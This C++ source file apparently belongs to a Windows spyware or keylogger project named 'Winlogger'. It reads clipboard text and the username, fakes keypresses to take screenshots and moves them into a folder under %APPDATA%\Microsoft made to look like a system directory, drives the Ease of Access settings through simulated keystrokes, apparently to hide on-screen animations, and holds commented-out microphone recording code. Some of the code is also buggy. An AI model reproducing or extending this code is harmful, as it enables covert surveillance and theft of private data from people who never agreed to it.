#include"Additional.h"

std::string Additional::directoryPath() {

	char** text = new char* [100];
	size_t* size = new size_t[1];
	const char* app = "appdata";
	_dupenv_s(text, size, app);

	std::string str = text[0];
	auto path = std::string(str);

	path = path + "\\Microsoft\\Winlogger\\";

	return path;
}

std::string Additional::GetClipboard() {
	if (!OpenClipboard(nullptr))
		std::cout << "Clipboard is empty";

	// Get handle of clipboard object for ANSI text
	HANDLE hData = GetClipboardData(CF_TEXT);
	if (hData == nullptr) 
		std::cout << "hData is empty";
	// Lock the handle to get the actual text pointer
	char* pszText = static_cast<char*>(GlobalLock(hData));

	//Check if the pszText is empty of not
	if (!(pszText == NULL)) {

		//Check Repeat of Clipboard Data
		if (text == pszText)
			return "";

		// Save text in a string class instance
		text = pszText;
	}
	else
	{
		//Delete pszText variable if it is empty and set NULL to text variable
		delete pszText;
		text = "";
	}

	// Release the lock
	GlobalUnlock(hData);

	// Release the clipboard
	CloseClipboard();

	return text;
}

void Additional::getUsername() {

	char name[100];
	std::string username;
	DWORD nUserName = sizeof(name);
	if (GetUserName((TCHAR*)name, &nUserName))
		this->username = name;

}

// Screenshot Code
void Additional::Screenshot() {

	// Trigger The Screenshot
	keybd_event((VK_LWIN), 0x5B, 0, 0);
	keybd_event((VK_SNAPSHOT), 0x2C, 0, 0);
	keybd_event((VK_LWIN), 0x5B, KEYEVENTF_KEYUP, 0); // Releasing The LWIN KEY
	keybd_event((VK_SNAPSHOT), 0x2C, KEYEVENTF_KEYUP, 0); // Releasing The SNAPSHOT KEY


	// Move the Screenshot
	Sleep(1000);
makedir:
	auto path = directoryPath();
	path = path + "Screenshots\\";
	bool check = CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;

	if (!check)
		goto makedir;

	system("move %USERPROFILE%\\Documents\\Pictures\\Screenshots\\*  %APPDATA%\\Microsoft\\Winlogger\\Screenshots");
}

// Disable animation Windows Code
#define VK_KEY_U 0x55
void Additional::disableAnimationWindows() {

	keybd_event((VK_LWIN), 0x5B, 0, 0);
	keybd_event((VK_KEY_U), 0x55, 0, 0);
	keybd_event((VK_LWIN), 0x5B, KEYEVENTF_KEYUP, 0);
	keybd_event((VK_KEY_U), 0x55, KEYEVENTF_KEYUP, 0);

	Sleep(1000);
	keybd_event((VK_TAB), 0x09, 0, 0);
	keybd_event((VK_TAB), 0x09, KEYEVENTF_KEYUP, 0);
	keybd_event((VK_TAB), 0x09, 0, 0);
	keybd_event((VK_TAB), 0x09, KEYEVENTF_KEYUP, 0);
	keybd_event((VK_TAB), 0x09, 0, 0);
	keybd_event((VK_TAB), 0x09, KEYEVENTF_KEYUP, 0);
	keybd_event((VK_TAB), 0x09, 0, 0);
	keybd_event((VK_TAB), 0x09, KEYEVENTF_KEYUP, 0);
	keybd_event((VK_TAB), 0x09, 0, 0);
	keybd_event((VK_TAB), 0x09, KEYEVENTF_KEYUP, 0);
	keybd_event((VK_TAB), 0x09, 0, 0);
	keybd_event((VK_TAB), 0x09, KEYEVENTF_KEYUP, 0);
	keybd_event((VK_TAB), 0x09, 0, 0);
	keybd_event((VK_TAB), 0x09, KEYEVENTF_KEYUP, 0);

	keybd_event((VK_SPACE), 0x20, 0, 0);
	keybd_event((VK_SPACE), 0x20, KEYEVENTF_KEYUP, 0);

	Sleep(2000);
	keybd_event((VK_LMENU), 0xA4, 0, 0);
	keybd_event((VK_F4), 0x73, 0, 0);
	keybd_event((VK_LMENU), 0xA4, KEYEVENTF_KEYUP, 0);
	keybd_event((VK_F4), 0x73, KEYEVENTF_KEYUP, 0);
}


void Additional::makedirectory() {
	auto path = directoryPath();

	bool check  = CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;

	if (!check)
		makedirectory();
}

// // Microphone Recording Code
//void Additional::recordingMicrophoneStart() {
//	recorder.start();
//}
//
//void Additional::recordingMicrophoneStop() {
//
//	
//
////	for (int i = 1; i <= 10; i++) {
//
//		recorder.stop();
//		sf::SoundBuffer Buffer = recorder.getBuffer();
//		Buffer.saveToFile("Recording.ogg");
//		
//	//	std::string file_location_recording = "C:\\Users\\D\\AppData\\Local\\Microsoft\\Winlogger\\Recording_" + std::to_string(i) +".ogg";
//
//	//	std::ifstream ifile;
//	//	ifile.open(file_location_recording.c_str());
//	//	if (ifile.is_open()) {
//	//		recorder.stop();
//	//		sf::SoundBuffer Buffer = recorder.getBuffer();
//	//		Buffer.saveToFile("Recording.ogg");
//	//	}
//	//}
//}
